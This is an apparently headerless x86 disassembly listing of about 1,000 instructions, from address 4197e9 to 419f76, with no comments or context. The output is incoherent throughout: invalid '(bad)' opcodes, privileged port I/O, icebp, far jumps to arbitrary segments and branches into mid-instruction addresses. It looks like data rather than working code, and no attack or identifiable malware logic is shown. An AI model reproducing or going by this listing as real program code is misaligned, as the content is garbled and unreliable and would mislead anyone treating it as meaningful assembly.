  4197e9:	xchg   esi,eax
  4197ea:	xchg   ecx,eax
  4197eb:	sahf   
  4197ec:	jle    0x41981c
  4197ee:	mov    BYTE PTR [esi+0x502e7037],cl
  4197f4:	inc    ecx
  4197f5:	in     al,dx
  4197f6:	sub    DWORD PTR [eax-0x2eee1b55],esi
  4197fc:	add    BYTE PTR [edi+0x69bd4855],ah
  419802:	icebp  
  419803:	or     ah,BYTE PTR [ebx+0x1b01c3d6]
  419809:	(bad)  
  41980a:	bound  eax,QWORD PTR [esi-0x6c1ee64f]
  419810:	out    0x5f,al
  419812:	push   ecx
  419813:	inc    edx
  419814:	mov    bh,0x2a
  419816:	cs (bad) 
  419818:	push   cs
  419819:	push   ecx
  41981a:	push   cs
  41981b:	mov    ebx,0xb8d82204
  419820:	ja     0x419898
  419822:	pop    ebp
  419823:	cs adc dl,cl
  419826:	stos   DWORD PTR es:[edi],eax
  419827:	int    0x48
  419829:	ja     0x4197cb
  41982b:	shr    DWORD PTR [edx-0x4d],1
  41982e:	xchg   edx,eax
  41982f:	test   BYTE PTR [edi+edi*1+0x1d],ch
  419833:	or     dl,BYTE PTR [edi+esi*4-0x1]
  419837:	out    0x67,al
  419839:	cmp    ah,dl
  41983b:	jmp    0x1a80:0xf6696916
  419842:	xchg   ebp,eax
  419843:	adc    DWORD PTR [esi],esi
  419845:	inc    edx
  419846:	les    ecx,FWORD PTR [edi]
  419848:	mov    edi,0x289d78a1
  41984d:	mov    eax,ds:0x5563a7d1
  419852:	bound  eax,QWORD PTR [ecx+0x33]
  419855:	mov    BYTE PTR [eax],al
  419857:	push   ebp
  419858:	jns    0x419801
  41985a:	popa   
  41985b:	sbb    al,ch
  41985d:	xchg   edx,eax
  41985e:	inc    edi
  41985f:	ficomp DWORD PTR [ecx-0x62]
  419862:	or     DWORD PTR [ecx+0x45],edx
  419865:	loopne 0x41981c
  419867:	retf   
  419868:	sub    edx,esp
  41986a:	sub    esp,ecx
  41986c:	fadd   DWORD PTR [eax+0x12]
  41986f:	frstpm(287 only) 
  419871:	jle    0x4198cd
  419873:	sbb    eax,0xcf0646b5
  419878:	out    dx,eax
  419879:	lock add al,0x6a
  41987c:	pop    ebp
  41987d:	and    DWORD PTR [ecx],esi
  41987f:	dec    eax
  419880:	retf   0x83f6
  419883:	(bad)
  419886:	xlat   BYTE PTR ds:[ebx]
  419887:	or     bl,ah
  419889:	adc    al,0x3b
  41988b:	fcom   QWORD PTR [ebx]
  41988d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41988e:	out    dx,al
  41988f:	imul   ecx,esi,0xffffffdb
  419892:	push   ss
  419893:	jmp    0x41985c
  419895:	dec    edx
  419896:	xor    al,0x28
  419898:	out    dx,al
  419899:	out    0xb0,eax
  41989b:	icebp  
  41989c:	int    0x2e
  41989e:	mov    dh,BYTE PTR [esi+0x7e90b3d0]
  4198a4:	xor    bl,al
  4198a6:	jg     0x4198a9
  4198a8:	add    DWORD PTR [edi-0x6c],ecx
  4198ab:	mov    dh,0xea
  4198ad:	loop   0x419896
  4198af:	xor    BYTE PTR [ecx+edi*8+0xd],bh
  4198b3:	scas   al,BYTE PTR es:[edi]
  4198b4:	push   0x26fee3de
  4198b9:	inc    ebx
  4198ba:	nop
  4198bb:	or     al,0x6f
  4198bd:	test   eax,0x6b78972e
  4198c2:	or     bl,dh
  4198c4:	test   al,0x7d
  4198c6:	mov    bh,0x3d
  4198c8:	sti    
  4198c9:	pop    es
  4198ca:	test   eax,0xf098309f
  4198cf:	inc    eax
  4198d0:	push   ss
  4198d1:	loop   0x4198e4
  4198d3:	out    dx,al
  4198d4:	cmp    BYTE PTR ds:0x143c6083,0x8d
  4198db:	cwde   
  4198dc:	pop    esi
  4198dd:	retf   0xa783
  4198e0:	(bad)  
  4198e1:	mov    ch,0x49
  4198e3:	inc    edx
  4198e4:	push   edx
  4198e5:	outs   dx,BYTE PTR ds:[esi]
  4198e6:	(bad)  
  4198e7:	xchg   esi,eax
  4198e8:	push   esi
  4198e9:	mov    bh,0x22
  4198eb:	jae    0x4198fc
  4198ed:	(bad)  
  4198ef:	and    eax,0x5e289a28
  4198f4:	aaa    
  4198f5:	repz ror dh,0x8d
  4198f9:	nop
  4198fa:	dec    edi
  4198fb:	mov    ebp,0xe2b25f94
  419900:	out    0x9b,al
  419902:	mov    al,0x3e
  419904:	stos   DWORD PTR es:[edi],eax
  419905:	out    0xba,eax
  419907:	cmp    al,0xf8
  419909:	pusha  
  41990a:	jae    0x4198d8
  41990c:	ret    0xe8b5
  41990f:	frstpm(287 only) 
  419911:	xchg   edx,eax
  419912:	sbb    edx,DWORD PTR [ecx]
  419914:	popa   
  419915:	or     DWORD PTR [edx],ebp
  419917:	mov    bh,0xba
  419919:	add    esp,ecx
  41991b:	pop    ebx
  41991c:	xchg   edx,eax
  41991d:	and    BYTE PTR [eax+0x63a3358c],dh
  419923:	sbb    BYTE PTR [edi-0x1e642276],ah
  419929:	retf   
  41992a:	mov    dl,0x11
  41992c:	addr16 jbe 0x419901
  41992f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419930:	icebp  
  419931:	xor    DWORD PTR [ecx],edi
  419933:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419934:	and    dh,BYTE PTR [esi+0x3e2043c4]
  41993a:	push   esp
  41993b:	les    ecx,FWORD PTR ss:[esp+edx*1]
  41993f:	retf   0x98cc
  419942:	mov    cl,0x40
  419944:	dec    edi
  419945:	xchg   esp,eax
  419946:	js     0x4198ef
  419948:	rcl    DWORD PTR [eax+0x1b],cl
  41994b:	mov    al,0xbb
  41994d:	mov    cl,0xbe
  41994f:	jbe    0x4199ca
  419951:	cmp    BYTE PTR [edx+0x571afc2f],bh
  419957:	jl     0x4198fa
  419959:	add    edx,esp
  41995b:	das    
  41995c:	mov    ds:0x845d5cb1,eax
  419961:	aad    0xb8
  419963:	or     BYTE PTR [eax+0x4526fcc6],dl
  419969:	pop    eax
  41996a:	popa   
  41996b:	and    eax,0xa86fea9d
  419970:	jp     0x419998
  419972:	cli    
  419973:	mov    bl,0x83
  419975:	or     al,0xcf
  419977:	inc    ebp
  419978:	adc    BYTE PTR [eax+0x3d654620],dh
  41997e:	mov    ds:0xd96f443a,eax
  419983:	hlt    
  419984:	mov    bh,0x1b
  419986:	mov    ebp,0xfbf04abe
  41998b:	lahf   
  41998c:	pop    esp
  41998d:	xchg   edi,eax
  41998e:	jns    0x41996b
  419990:	stos   BYTE PTR es:[edi],al
  419991:	and    bl,BYTE PTR [ebp+0x6eb7990d]
  419997:	push   esi
  419998:	add    eax,DWORD PTR [eax-0x47f9de02]
  41999e:	fisub  WORD PTR [ecx]
  4199a0:	out    dx,eax
  4199a1:	dec    ebp
  4199a2:	arpl   WORD PTR [ebp+0x1b0a91af],cx
  4199a8:	inc    ebx
  4199a9:	repnz fnstcw WORD PTR [ebx]
  4199ac:	xor    BYTE PTR [ecx+0x57a80277],dh
  4199b2:	sub    BYTE PTR [ebx],bl
  4199b4:	push   DWORD PTR [edi-0x16]
  4199b7:	je     0x4199e3
  4199b9:	pushf  
  4199ba:	popf   
  4199bb:	dec    BYTE PTR [edx]
  4199bd:	xor    eax,0x73f1c5ef
  4199c2:	fisttp WORD PTR [edi+0x3e]
  4199c5:	push   edx
  4199c6:	jns    0x4199b5
  4199c8:	mov    dl,0xeb
  4199ca:	cwde   
  4199cb:	mov    al,0xd3
  4199cd:	ss mov al,0xf2
  4199d0:	add    al,0x4b
  4199d2:	xor    ecx,DWORD PTR [edx+eax*2-0x7daf73a7]
  4199d9:	sub    esi,ebx
  4199db:	mov    ebx,0x326cd70d
  4199e0:	popf   
  4199e1:	cs nop
  4199e3:	jns    0x419985
  4199e5:	push   ecx
  4199e6:	jne    0x4199b2
  4199e8:	leave  
  4199e9:	mov    eax,fs
  4199eb:	imul   ebx,esi,0xb9f7fe7a
  4199f1:	pop    ecx
  4199f2:	pop    esp
  4199f3:	dec    ebp
  4199f4:	mov    bh,0x8e
  4199f6:	pop    edi
  4199f7:	paddw  mm6,QWORD PTR [ebp+0x53bfa8ac]
  4199fe:	xor    al,bh
  419a00:	push   ebp
  419a01:	int    0x15
  419a03:	add    edi,ecx
  419a05:	scas   al,BYTE PTR es:[edi]
  419a06:	and    eax,DWORD PTR [esi-0x3]
  419a09:	mov    fs,WORD PTR [eax]
  419a0b:	loopne 0x419997
  419a0d:	cmp    dl,BYTE PTR [edx+0x2a5978e6]
  419a13:	pop    eax
  419a14:	jecxz  0x419a1e
  419a16:	adc    eax,0xb5f94bb3
  419a1b:	push   ds
  419a1c:	mov    esi,0xf646861a
  419a21:	adc    eax,edx
  419a23:	int3   
  419a24:	scas   eax,DWORD PTR es:[edi]
  419a25:	pop    ebp
  419a26:	sahf   
  419a27:	and    esp,DWORD PTR [ecx+ecx*1+0x230cf5eb]
  419a2e:	dec    esp
  419a2f:	jb     0x419a8c
  419a31:	sub    BYTE PTR [eax-0x1b3e7577],dh
  419a37:	test   DWORD PTR [ebx+0x6c89c184],0xa2396ff9
  419a41:	mov    edi,0xbaf64538
  419a46:	mov    al,0x6a
  419a48:	jp     0x4199f2
  419a4a:	dec    esp
  419a4b:	jmp    0x4199e5
  419a4d:	xchg   edi,eax
  419a4e:	or     DWORD PTR [edi],edx
  419a50:	mov    edx,edi
  419a52:	pop    edi
  419a53:	add    al,0xbc
  419a55:	in     al,0xb6
  419a57:	adc    eax,0xa7bf0aae
  419a5c:	lock jno 0x419a73
  419a5f:	leave  
  419a60:	lods   eax,DWORD PTR ds:[esi]
  419a61:	or     eax,0xc62ddf04
  419a66:	in     eax,0xa6
  419a68:	jno    0x419a18
  419a6a:	fdivr  st(3),st
  419a6c:	jbe    0x419a75
  419a6e:	cmp    DWORD PTR [ecx],ecx
  419a70:	sub    cl,BYTE PTR [eax]
  419a72:	jns    0x419ae3
  419a74:	sub    al,0x70
  419a76:	sbb    DWORD PTR [ecx],edx
  419a78:	sar    edi,0x52
  419a7b:	jo     0x419acf
  419a7d:	imul   esi,DWORD PTR [edi-0x68],0x22
  419a81:	and    BYTE PTR [ebp+0x63],cl
  419a84:	xor    DWORD PTR [esi-0x72],0x74b7001a
  419a8b:	in     al,0x5d
  419a8d:	sub    bh,0x9f
  419a90:	sahf   
  419a91:	dec    ebx
  419a92:	test   eax,0x8670240d
  419a97:	js     0x419a4f
  419a99:	jmp    0xb6cdae9e
  419a9e:	fisttp WORD PTR [ebx+0x4d86d852]
  419aa4:	lods   eax,DWORD PTR ds:[esi]
  419aa5:	push   ebx
  419aa6:	fild   QWORD PTR [edi]
  419aa8:	mov    ds:0x7c4feae4,eax
  419aad:	adc    al,0xc8
  419aaf:	ja     0x419a3b
  419ab1:	add    edi,DWORD PTR [esi]
  419ab3:	pop    esi
  419ab4:	inc    eax
  419ab5:	pushf  
  419ab6:	fwait
  419ab7:	dec    edi
  419ab8:	int    0x3e
  419aba:	xchg   edx,eax
  419abb:	adc    BYTE PTR [edi+0x8],0xac
  419abf:	mov    eax,ds:0xbe8b2293
  419ac5:	xchg   esi,eax
  419ac6:	mov    esp,cs
  419ac8:	sbb    ebp,DWORD PTR [ebp+0x5f451d18]
  419ace:	adc    eax,0xe0fb4324
  419ad3:	call   0x9def3a95
  419ad8:	jae    0x419a68
  419ada:	sbb    eax,0x6266146b
  419adf:	jnp    0x419b15
  419ae1:	or     BYTE PTR [esi+0x2e],bl
  419ae4:	xor    BYTE PTR [eax+0x5e],bl
  419ae7:	cmp    dl,BYTE PTR [edi]
  419ae9:	pop    eax
  419aea:	push   esi
  419aeb:	dec    ebx
  419aec:	adc    DWORD PTR [edx-0xd911ce4],0x17
  419af3:	mov    DWORD PTR [ebp+0x40d4ef01],ebx
  419af9:	mov    dl,0xe9
  419afb:	and    al,0xcc
  419afd:	scas   al,BYTE PTR es:[edi]
  419afe:	mov    edi,DWORD PTR [edi]
  419b00:	ret    
  419b01:	dec    ebp
  419b02:	push   0x6f
  419b04:	pop    ebx
  419b05:	jae    0x419b24
  419b07:	cmc    
  419b08:	scas   eax,DWORD PTR es:[edi]
  419b09:	jge    0x419b5c
  419b0b:	mov    edx,0x9b4c145f
  419b10:	xchg   ecx,eax
  419b11:	push   0xbf718bf4
  419b16:	lahf   
  419b17:	or     ebx,DWORD PTR [edx+edi*4+0x1f]
  419b1b:	ret    
  419b1c:	or     al,0xdf
  419b1e:	add    ch,ah
  419b20:	xor    BYTE PTR [esi],bh
  419b22:	and    al,0xaa
  419b24:	outs   dx,DWORD PTR ds:[esi]
  419b25:	test   dl,ah
  419b27:	pop    ecx
  419b28:	adc    ah,BYTE PTR [ebx+eiz*8+0x7f5546a6]
  419b2f:	enter  0x9f84,0x77
  419b33:	(bad)  
  419b34:	mov    esp,0xb8d1522b
  419b39:	mov    eax,0xf0362b8f
  419b3e:	fsub   DWORD PTR [esi-0xda41027]
  419b44:	xor    BYTE PTR [edi-0x2e],0x92
  419b48:	dec    ebp
  419b49:	fbstp  TBYTE PTR [ecx+0x65]
  419b4c:	jb     0x419ad3
  419b4e:	inc    esi
  419b4f:	sbb    al,0x19
  419b51:	(bad)  
  419b52:	mov    bl,0x3
  419b54:	pop    esp
  419b55:	pop    ebx
  419b56:	cmp    BYTE PTR [edi-0x7e],cl
  419b59:	je     0x419b42
  419b5b:	mov    edi,0xb5e4ea14
  419b60:	adc    bh,BYTE PTR [ecx-0x64]
  419b63:	adc    BYTE PTR [esi+0x44],ah
  419b66:	stos   BYTE PTR es:[edi],al
  419b67:	push   ebx
  419b68:	int3   
  419b69:	stos   BYTE PTR es:[edi],al
  419b6a:	xchg   ebx,eax
  419b6b:	cmp    eax,0xc6873ff2
  419b70:	pushf  
  419b71:	xchg   ecx,eax
  419b72:	sbb    al,0x67
  419b74:	push   edx
  419b75:	mov    cl,0x2e
  419b77:	js     0x419b0b
  419b79:	jge    0x419bd5
  419b7b:	into   
  419b7c:	push   eax
  419b7d:	adc    eax,DWORD PTR [edi]
  419b7f:	mov    cl,0x1e
  419b81:	sar    BYTE PTR [edx],0x80
  419b84:	mov    ds:0xe591cf0,eax
  419b89:	add    ecx,DWORD PTR [eax-0x247da4bf]
  419b8f:	inc    ebx
  419b90:	sbb    al,0x47
  419b92:	mov    edx,0xba7e9987
  419b97:	jno    0x419bf7
  419b99:	shl    BYTE PTR [ebx-0x10eb69d8],0xc3
  419ba0:	push   0xb30c3632
  419ba5:	out    0x9a,eax
  419ba7:	fist   WORD PTR [ecx+esi*1+0x2ce8f70a]
  419bae:	pop    ds
  419baf:	out    0x10,eax
  419bb1:	pop    esi
  419bb2:	stc    
  419bb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bb4:	jno    0x419b7b
  419bb6:	test   dh,dh
  419bb8:	in     al,0x23
  419bba:	leave  
  419bbb:	loopne 0x419b74
  419bbd:	mov    ecx,0xdde9fc7a
  419bc2:	(bad)  
  419bc3:	cld    
  419bc4:	(bad)  
  419bc6:	adc    BYTE PTR [ebx-0x621618bd],bl
  419bcc:	out    dx,al
  419bcd:	or     edx,DWORD PTR [edx]
  419bcf:	pusha  
  419bd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bd1:	clc    
  419bd2:	mov    WORD PTR [ebx-0x40e921b4],?
  419bd8:	xchg   esp,eax
  419bd9:	sub    BYTE PTR [ecx-0x12df5bff],ah
  419bdf:	mov    ?,WORD PTR [esi+0x5d]
  419be2:	es popf 
  419be4:	xor    al,0x66
  419be6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419be7:	and    al,BYTE PTR [edi+0x154e56e7]
  419bed:	ret    0x71b0
  419bf0:	ret    0x37e9
  419bf3:	sbb    ch,BYTE PTR [edx-0x4f]
  419bf6:	and    DWORD PTR [ebp+0x1],0xffffff8a
  419bfa:	imul   eax,esi,0x7323254
  419c00:	arpl   WORD PTR [ecx-0x4],si
  419c03:	jge    0x419be5
  419c05:	jne    0x419c10
  419c07:	ret    
  419c08:	stos   BYTE PTR es:[edi],al
  419c09:	xor    bl,BYTE PTR [ecx]
  419c0b:	mov    al,ds:0xbdd3e650
  419c10:	inc    esp
  419c11:	fwait
  419c12:	scas   eax,DWORD PTR es:[edi]
  419c13:	pop    ds
  419c14:	mov    bh,0x3d
  419c16:	ins    BYTE PTR es:[edi],dx
  419c17:	fistp  WORD PTR [esi-0x72]
  419c1a:	(bad)  
  419c1b:	sbb    esi,DWORD PTR [esi+0x56]
  419c1e:	ins    BYTE PTR es:[edi],dx
  419c1f:	jge    0x419bb9
  419c21:	pop    ecx
  419c22:	loopne 0x419bb8
  419c24:	dec    ebp
  419c25:	imul   DWORD PTR [ebp+0x64]
  419c28:	enter  0x3e1e,0xbf
  419c2c:	jo     0x419ca9
  419c2e:	add    eax,0xd6dfadd4
  419c33:	in     eax,dx
  419c34:	ror    ecx,cl
  419c36:	mov    bl,0xf7
  419c38:	(bad)  
  419c39:	adc    DWORD PTR [ecx+ebp*2],edx
  419c3c:	dec    ebp
  419c3d:	shl    BYTE PTR [ebx+0x21fec11c],0xea
  419c44:	push   eax
  419c45:	jmp    0xed3588b1
  419c4a:	lods   eax,DWORD PTR ds:[esi]
  419c4b:	lock test DWORD PTR [esi+0x1246ee5e],0x3b0a6e23
  419c56:	outs   dx,BYTE PTR ds:[esi]
  419c57:	fsubr  QWORD PTR [esi]
  419c59:	dec    ebx
  419c5a:	xchg   BYTE PTR [ecx],dl
  419c5c:	cs repnz adc al,0xa7
  419c60:	pop    edx
  419c61:	inc    edi
  419c62:	mov    ds:0x8c1ba730,al
  419c67:	pop    es
  419c68:	mov    edi,0x11234ac0
  419c6d:	jbe    0x419c83
  419c6f:	sahf   
  419c70:	das    
  419c71:	test   al,dh
  419c73:	shl    DWORD PTR [ebx],0xb1
  419c76:	or     al,bl
  419c78:	xchg   BYTE PTR [ebx+0x47],bl
  419c7b:	scas   al,BYTE PTR es:[edi]
  419c7c:	cld    
  419c7d:	(bad)  
  419c7f:	lods   al,BYTE PTR ds:[esi]
  419c80:	inc    esi
  419c81:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c83:	into   
  419c84:	pop    es
  419c85:	dec    esi
  419c86:	loop   0x419cdd
  419c88:	add    BYTE PTR [ebx],dh
  419c8a:	test   ecx,0xe377806f
  419c90:	jbe    0x419cc9
  419c92:	gs add al,0x6b
  419c95:	sbb    DWORD PTR [edi+0x6b797219],0x26101f45
  419c9f:	mov    eax,0x1f31b1a1
  419ca4:	test   DWORD PTR [ecx-0x26],0xd7653d88
  419cab:	jp     0x419c6e
  419cad:	ins    DWORD PTR es:[edi],dx
  419cae:	push   esi
  419caf:	sub    cl,BYTE PTR [esi]
  419cb1:	xchg   edi,eax
  419cb2:	jge    0x419d29
  419cb4:	dec    edi
  419cb5:	mov    ah,0xa6
  419cb7:	pop    esi
  419cb8:	dec    edx
  419cb9:	call   DWORD PTR [eax]
  419cbb:	jle    0x419cb9
  419cbd:	mov    ch,0x9d
  419cbf:	cmp    al,0x72
  419cc1:	mov    ebx,0xa326ff38
  419cc6:	adc    DWORD PTR [edx+0x181f629],edi
  419ccc:	dec    ebp
  419ccd:	outs   dx,BYTE PTR ds:[esi]
  419cce:	pop    esi
  419ccf:	enter  0x7407,0x28
  419cd3:	push   ebx
  419cd4:	outs   dx,BYTE PTR ds:[esi]
  419cd5:	(bad)  
  419cd6:	mov    ds:0x35bdd786,eax
  419cdb:	fst    QWORD PTR [edi]
  419cdd:	mov    ds:0x41f06b65,al
  419ce2:	retf   0xc1d
  419ce5:	inc    ebp
  419ce6:	or     BYTE PTR [edx-0x189b64f8],dl
  419cec:	or     al,0x75
  419cee:	xchg   BYTE PTR [edi],al
  419cf0:	test   BYTE PTR [ecx+0x7c71f95],0x13
  419cf7:	aam    0x51
  419cf9:	aad    0x60
  419cfb:	clc    
  419cfc:	mov    bl,0xeb
  419cfe:	mov    ?,WORD PTR [esi+0x7b395f0b]
  419d04:	popf   
  419d05:	pop    ebx
  419d06:	retf   0xecc0
  419d09:	sbb    esi,ebx
  419d0b:	frstor [ebp+0x4ffc25b7]
  419d11:	in     al,dx
  419d12:	int3   
  419d13:	out    dx,al
  419d14:	or     DWORD PTR [edx-0x22],ebp
  419d17:	dec    ebp
  419d18:	jp     0x419d08
  419d1a:	mov    eax,0xf2ab8c01
  419d1f:	jle    0x419d47
  419d21:	dec    edi
  419d22:	mov    edx,0x14a06e79
  419d27:	pop    edi
  419d28:	out    dx,al
  419d29:	sub    eax,0x2892825e
  419d2e:	and    eax,0x5b7a10c3
  419d33:	inc    ecx
  419d34:	jo     0x419cff
  419d36:	jmp    0xeba3:0xc480396b
  419d3d:	fisttp DWORD PTR [eax+0x39be59b3]
  419d43:	lods   al,BYTE PTR ds:[esi]
  419d44:	jg     0x419d28
  419d46:	xor    DWORD PTR [ebx-0x38],ecx
  419d49:	jge    0x419d94
  419d4b:	inc    edx
  419d4c:	scas   al,BYTE PTR es:[edi]
  419d4d:	rcr    BYTE PTR [esi+edx*8+0x64],0x18
  419d52:	dec    edi
  419d53:	out    dx,al
  419d54:	jecxz  0x419d7b
  419d56:	mov    WORD PTR [ecx+0x4a9745c7],cs
  419d5c:	fsubr  st(2),st
  419d5e:	fistp  QWORD PTR [edx]
  419d60:	sbb    ch,dl
  419d62:	mov    esp,0x8de5dad
  419d67:	sub    dl,dl
  419d69:	sbb    esi,eax
  419d6b:	cmp    DWORD PTR ds:0x92c1ad47,ecx
  419d71:	jmp    0x419d9e
  419d73:	out    dx,eax
  419d74:	and    al,BYTE PTR [esi]
  419d76:	dec    eax
  419d77:	dec    esp
  419d78:	sub    DWORD PTR [ecx-0x72],esp
  419d7b:	inc    ecx
  419d7c:	dec    DWORD PTR [edi]
  419d7e:	sub    ebx,edx
  419d80:	daa    
  419d81:	fsubr  QWORD PTR [ebx+0x25]
  419d84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d85:	stc    
  419d86:	daa    
  419d87:	test   eax,0xbb605c06
  419d8c:	and    ch,bh
  419d8e:	pop    es
  419d8f:	pop    ds
  419d90:	mov    eax,0x8aceba0e
  419d95:	ja     0x419dd9
  419d97:	xchg   esi,eax
  419d98:	stos   BYTE PTR es:[edi],al
  419d99:	fidiv  WORD PTR [edx+0x28614cec]
  419d9f:	fild   QWORD PTR [ebx-0x2]
  419da2:	iret   
  419da3:	push   ss
  419da4:	inc    ebx
  419da5:	mov    esi,0x60f9f9d2
  419daa:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  419dac:	inc    edi
  419dad:	mov    cl,0x50
  419daf:	and    ecx,DWORD PTR [esi+eiz*2-0x21]
  419db3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419db4:	aaa    
  419db5:	sub    BYTE PTR [edx],bl
  419db7:	je     0x419dad
  419db9:	loopne 0x419db4
  419dbb:	dec    ecx
  419dbc:	and    bl,BYTE PTR [ebp-0x1a]
  419dbf:	xchg   edx,eax
  419dc0:	jecxz  0x419e34
  419dc2:	scas   al,BYTE PTR es:[edi]
  419dc3:	mov    bh,ch
  419dc5:	xor    edi,edi
  419dc7:	or     bl,BYTE PTR [ecx+0x27a0b3cf]
  419dcd:	rcr    BYTE PTR [edi],0x13
  419dd0:	or     dh,bh
  419dd2:	dec    ebx
  419dd3:	bnd jmp 0xe89d94c0
  419dd9:	in     eax,0x8a
  419ddb:	jo     0x419de3
  419ddd:	push   ecx
  419dde:	mov    ds:0x275b8b56,al
  419de3:	dec    edx
  419de4:	hlt    
  419de5:	pop    ebp
  419de6:	xor    al,0xff
  419de8:	adc    bl,ch
  419dea:	scas   al,BYTE PTR es:[edi]
  419deb:	pushf  
  419dec:	jbe    0x419e26
  419dee:	jb     0x419df6
  419df0:	idiv   DWORD PTR [edx]
  419df2:	popf   
  419df3:	outs   dx,BYTE PTR ds:[esi]
  419df4:	xchg   BYTE PTR [edx-0xf5dc5d0],dh
  419dfa:	fwait
  419dfb:	jae    0x419dcb
  419dfd:	std    
  419dfe:	sbb    ebp,edx
  419e00:	cld    
  419e01:	mov    al,ds:0x6f18d5cb
  419e06:	into   
  419e07:	cmp    BYTE PTR [edx-0x6d8c304d],dl
  419e0d:	test   eax,0xa89c0e20
  419e12:	xor    ah,bh
  419e14:	jge    0x419e44
  419e16:	cmp    BYTE PTR [esi+eax*2-0x74690586],ah
  419e1d:	mov    eax,0xe8cc3c04
  419e22:	jo     0x419df6
  419e24:	pop    esi
  419e25:	out    0x3c,al
  419e27:	jo     0x419dc7
  419e29:	add    ecx,DWORD PTR [ecx]
  419e2b:	rcr    BYTE PTR [eax],1
  419e2d:	js     0x419e21
  419e2f:	add    ebp,DWORD PTR [ebx-0x723d913f]
  419e35:	fdiv   DWORD PTR [ecx]
  419e37:	dec    edi
  419e38:	lds    eax,FWORD PTR [ebx+eax*2-0x3a]
  419e3c:	jmp    0xbec5:0xb5614c9d
  419e43:	push   es
  419e44:	mov    ch,0x40
  419e46:	ret    
  419e47:	inc    esp
  419e48:	pushf  
  419e49:	xchg   ebx,eax
  419e4a:	in     eax,dx
  419e4b:	sbb    BYTE PTR [ebp-0x48928463],ah
  419e51:	rcr    DWORD PTR cs:[edi+0x785e8c19],1
  419e58:	xchg   ecx,eax
  419e59:	scas   al,BYTE PTR es:[edi]
  419e5a:	jge    0x419df1
  419e5c:	sar    BYTE PTR [ecx],1
  419e5e:	nop
  419e5f:	mov    cl,0x27
  419e61:	scas   eax,DWORD PTR es:[edi]
  419e62:	sub    eax,0x9f42a0e
  419e67:	out    dx,eax
  419e68:	and    DWORD PTR [edi+0x5466c261],ebx
  419e6e:	test   eax,0x27e41c4c
  419e73:	scas   al,BYTE PTR es:[edi]
  419e74:	(bad)  
  419e75:	imul   edx,DWORD PTR [ecx-0x15],0x4fa83a23
  419e7c:	sbb    bh,dl
  419e7e:	icebp  
  419e7f:	std    
  419e80:	jecxz  0x419e4a
  419e82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e83:	call   0xbb8f:0x139df6ee
  419e8a:	jae    0x419ec2
  419e8c:	stos   BYTE PTR es:[edi],al
  419e8d:	lods   eax,DWORD PTR ds:[esi]
  419e8e:	into   
  419e8f:	outs   dx,BYTE PTR ds:[esi]
  419e90:	rol    BYTE PTR cs:[esi+0x53],1
  419e94:	test   BYTE PTR [edx+edx*8],cl
  419e97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e98:	mov    edx,0x902c1ec6
  419e9d:	adc    al,0x79
  419e9f:	inc    esi
  419ea0:	inc    eax
  419ea1:	xchg   ebx,eax
  419ea2:	test   BYTE PTR [ebp-0x56],0xf7
  419ea6:	sub    dl,BYTE PTR [edx]
  419ea8:	scas   eax,DWORD PTR es:[edi]
  419ea9:	jg     0x419f15
  419eab:	retf   0xec37
  419eae:	loope  0x419e8d
  419eb0:	xor    DWORD PTR [edi],ecx
  419eb2:	frstor [esi+0x10]
  419eb5:	add    eax,0x10112f31
  419eba:	aam    0x5f
  419ebc:	push   edx
  419ebd:	cmp    DWORD PTR [edi],esp
  419ebf:	sub    BYTE PTR [ebp+0x15d617d8],ch
  419ec5:	fiadd  WORD PTR [esi]
  419ec7:	aad    0x54
  419ec9:	push   cs
  419eca:	jne    0x419e85
  419ecc:	add    DWORD PTR [ecx+0x1560f4d5],0x43
  419ed3:	(bad)  
  419ed4:	xchg   ebp,eax
  419ed5:	add    eax,0x11d62c42
  419eda:	mov    ds:0x5f2ecee9,eax
  419edf:	cmp    DWORD PTR [eax-0x3f4e0602],ebp
  419ee5:	and    eax,0xbf8c1b0f
  419eea:	mov    dh,BYTE PTR [esp+edi*4-0x3a]
  419eee:	sbb    eax,0x7ccb3d46
  419ef3:	ins    BYTE PTR es:[edi],dx
  419ef4:	add    DWORD PTR [ebx+0x661cc116],ebx
  419efa:	in     al,dx
  419efb:	jae    0x419f50
  419efd:	jnp    0x419ef0
  419eff:	dec    si
  419f01:	cwde   
  419f02:	fwait
  419f03:	test   al,0xdb
  419f05:	outs   dx,BYTE PTR ds:[si]
  419f07:	adc    esp,ecx
  419f09:	cmp    DWORD PTR [edx+ecx*4-0x72],eax
  419f0d:	cld    
  419f0e:	cmp    DWORD PTR [eax+0x4b939664],ebx
  419f14:	xchg   ebx,eax
  419f15:	xchg   ebp,edi
  419f17:	jge    0x419f96
  419f19:	sub    ebx,DWORD PTR [eax-0x74]
  419f1c:	pop    esp
  419f1d:	mov    esi,0xe2ed2d5
  419f22:	push   edx
  419f23:	lea    ecx,[ecx]
  419f25:	push   ds
  419f26:	sahf   
  419f27:	sub    DWORD PTR [edx-0x8],ebx
  419f2a:	sub    cl,BYTE PTR [ecx]
  419f2c:	aad    0x57
  419f2e:	inc    esi
  419f2f:	and    dh,ah
  419f31:	mov    ebp,0xc13abfa6
  419f36:	fistp  WORD PTR [eax]
  419f38:	or     DWORD PTR [esi-0x5f87c364],0x1f77cf20
  419f42:	mov    edi,0x9319b154
  419f47:	xchg   edi,eax
  419f48:	loope  0x419f89
  419f4a:	ret    
  419f4b:	cmovle esp,DWORD PTR [eax-0x43]
  419f4f:	sub    eax,0xb765e146
  419f54:	aaa    
  419f55:	into   
  419f56:	retf   
  419f57:	dec    edx
  419f58:	shl    DWORD PTR [esi],1
  419f5a:	mov    ah,0x23
  419f5c:	in     al,dx
  419f5d:	jae    0x419fba
  419f5f:	retf   
  419f60:	mov    cl,0x8b
  419f62:	sbb    dl,cl
  419f64:	js     0x419f93
  419f66:	cmp    al,0xc3
  419f68:	xor    ebp,ebx
  419f6a:	and    DWORD PTR [esi+0x52e7a2b4],0x3e6ee8a7
  419f74:	dec    ebp
  419f75:	std    
  419f76:	push   eax
